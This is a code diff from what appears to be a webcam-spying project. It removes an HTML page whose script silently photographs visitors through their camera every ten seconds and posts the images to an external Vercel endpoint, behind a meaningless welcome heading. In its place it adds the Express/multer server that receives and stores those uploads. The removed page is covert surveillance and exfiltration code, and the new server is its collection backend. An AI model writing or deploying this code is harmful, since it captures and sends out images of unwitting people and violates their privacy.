@@ -1,50 +1,37 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture and Upload Photo</title>
-</head>
-<body>
-    <h1>welcome to my world !!!! 12345678</h1>
-    <script>
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
+const express = require("express");
+const multer = require("multer");
+const path = require("path");
+const cors = require("cors");
 
-        // Access the device camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+// Create Express app
+const app = express();
 
-                // Capture photo every 10 seconds
-                setInterval(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-                    canvas.toBlob((blob) => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'photo.jpg');
+// Enable CORS for your frontend URL
+app.use(cors({
+  origin: ["https://nodebacked.vercel.app"], // Update with your frontend URL
+  methods: ["GET", "POST"]
+}));
 
-                        // Send the photo to the server
-                        fetch('https://nodebacked.vercel.app/api/upload', {  // replace url
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.text())
-                        .then(data => {
-                            console.log(data); // Log success message
-                        })
-                        .catch(error => {
-                            console.error('Error uploading photo:', error);
-                        });
-                    }, 'image/jpeg');
-                }, 10000); // 10 seconds
-            })
-            .catch((err) => {
-                console.error("Error accessing camera: ", err);
-            });
-    </script>
-</body>
-</html>
+// Set up multer for file uploads
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    cb(null, "/tmp"); // Temporary storage in Vercel
+  },
+  filename: (req, file, cb) => {
+    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+    cb(null, `photo-${timestamp}.jpg`);
+  }
+});
+
+const upload = multer({ storage });
+
+// API endpoint to handle file uploads
+app.post("/api/upload", upload.single("photo"), (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ message: "No file uploaded." });
+  }
+  res.status(200).json({ message: "Photo uploaded successfully", file: req.file.filename });
+});
+
+// Export the app to Vercel
+module.exports = app;
